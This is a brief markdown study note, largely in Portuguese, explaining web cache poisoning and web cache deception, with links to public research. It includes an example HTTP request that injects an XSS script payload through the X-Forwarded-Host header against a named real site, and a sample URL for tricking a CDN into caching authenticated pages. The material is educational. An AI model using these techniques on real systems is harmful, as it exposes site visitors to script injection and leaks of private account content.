## Web Cache Poison
- se aproveitar de parâmetros ignorados na decisão de cachear uma página para modificar sua resposta de forma maliciosa e então quando o cache expira (ou uma url inédita é solicitada) a página com conteúdo modificado é cacheada. O atacante modifica e cacheia uma response para posteriormente a vítima acessar
- https://portswigger.net/research/practical-web-cache-poisoning
### Exemplo
```http
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>

HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<meta property="og:image" content="https://a."><script>alert(1)</script>"/> 
```

## Web Cache Deception
- se aproveitar de regras para cachear respostas autênticas como se fossem arquivos estáticos, ex: uma vítima acessa  http://www.example.com/home.php/non-existent.css (essa página tem que retornar o home.php normalmente), então o CDN faz cache da página por interpretar como um arquivo estático
### Condições
* Web cache functionality is set for the web application to cache static files based on their extensions, disregarding any caching header
* When accessing a page like http://www.example.com/home.php/nonexistent.css, the web server will return the content of home.php for that URL
* Victim has to be authenticated while accessing the triggering URL

- https://www.blackhat.com/docs/us-17/wednesday/us-17-Gil-Web-Cache-Deception-Attack.pdf
- https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html